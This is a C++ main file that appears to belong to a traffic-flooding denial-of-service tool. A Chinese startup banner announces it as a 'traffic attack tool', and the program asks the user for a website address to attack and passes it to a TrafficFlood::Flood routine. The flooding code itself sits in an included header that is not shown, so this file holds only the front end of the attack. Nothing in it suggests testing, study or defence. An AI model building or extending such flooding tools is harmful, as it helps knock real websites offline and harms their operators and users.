#include <iostream>
#include <string>

#include "src/Controller/TrafficFlood.h"

using namespace std;

void Attack(std::string ip);

int main(int argc, char **argv) {
    std::string url;
    cout << " > 2D05 流量攻击工具已启动！< " << endl;

    cout << "|>请输入要攻击的网址: ";
    cin >> url;

    Attack(url);

    return 0x0;
}

void Attack(std::string ip) {
    TrafficFlood trafficFlood;
    trafficFlood.Flood(ip);
}